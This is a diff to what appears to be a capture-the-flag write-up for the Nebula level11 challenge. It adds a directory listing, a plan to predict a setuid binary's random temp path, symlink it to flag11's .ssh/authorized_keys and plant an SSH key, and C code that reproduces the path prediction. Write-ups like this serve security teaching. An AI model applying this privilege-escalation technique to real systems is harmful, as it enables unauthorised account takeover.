@@ -4,6 +4,18 @@ The /home/flag11/flag11 binary processes standard input and executes a shell com
 There are two ways of completing this level, you may wish to do both :-)
 
 ## Solution
+```console
+level11@nebula:/home/flag11$ ls -la
+total 17
+drwxr-x--- 3 flag11 level11    92 2012-08-20 18:58 .
+drwxr-xr-x 1 root   root       60 2012-08-27 07:18 ..
+-rw-r--r-- 1 flag11 flag11    220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag11 flag11   3353 2011-05-18 02:54 .bashrc
+-rwsr-x--- 1 flag11 level11 12135 2012-08-19 20:55 flag11
+-rw-r--r-- 1 flag11 flag11    675 2011-05-18 02:54 .profile
+drwxr-xr-x 2 flag11 flag11      3 2012-08-27 07:15 .ssh
+```
+Notice `.ssh`, it could come in handy later.
 ```c
 #include <stdlib.h>
 #include <unistd.h>
@@ -331,3 +343,55 @@ int getrand(char **path)
 By guessing the difference in seconds between execution of our exploit and the program we can hit the same `path`.
 
 This will allow us to create a `symlink` in `path` that points to wherever we want to write as `flag11`.
+
+Recall the `.ssh` folder in `flag11`'s home directory, and remember `level05` where we used `id_rsa` to login via `SSH`.
+
+We can generate a key combination and save the `public key` as `.ssh/authorized_keys`, which to remind you, holds `public key`s, seperated by `newline`s, permitted to login through `SSH`.
+
+### The Plan
+1. generate `SSH` `rsa` key pair
+2. predict random `path`
+3. write a `symlink` that points to `.ssh/authorized_keys`
+4. start `flag11` and input a buffer `>= 1024 bytes` containing `\npublic key\n`
+5. login using `private key` through `SSH`
+
+### Writing The Exploit
+```c
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+#define USAGE "Usage:\n\t%s time_delay pid_delay\n"
+
+int main(int argc, char **argv)
+{
+    char *tmp;
+    int pid;
+    int fd;
+
+    int time_delay;
+    int pid_delay;
+
+    if (argc < 3){
+        printf(USAGE, argv[0]);
+        return -1;
+    }
+
+    time_delay = atoi(argv[1]);
+    pid_delay = atoi(argv[2]);
+
+    srandom(time(NULL) + time_delay);
+
+    tmp = getenv("TEMP");
+    pid = getpid();
+
+    printf("%s/%d.%c%c%c%c%c%c", tmp, pid + pid_delay,
+            'A' + (random() % 26), '0' + (random() % 10),
+            'a' + (random() % 26), 'A' + (random() % 26),
+            '0' + (random() % 10), 'a' + (random() % 26));
+
+    return 0;
+}
+```
